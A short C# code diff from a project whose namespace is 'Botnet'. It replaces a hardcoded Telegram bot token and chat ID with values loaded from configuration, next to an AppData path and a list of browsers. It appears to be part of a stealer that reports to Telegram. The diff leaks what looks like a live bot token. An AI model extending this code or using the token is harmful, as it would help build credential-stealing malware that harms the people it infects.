@@ -6,8 +6,8 @@ namespace Botnet
     {
         public static char spliter = '|';
         public static string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
-        public const string Token = "757379845:AAGS_av1RT99Kf9BzyALTol6FzLyywIqe0U";
-        public const string Chat_ID = "454529803";
+        public static readonly string Token = Utilities.GetData("Token");
+        public static readonly string Chat_ID = Utilities.GetData("ChatId");
 
         public static string[] browsers =
             {
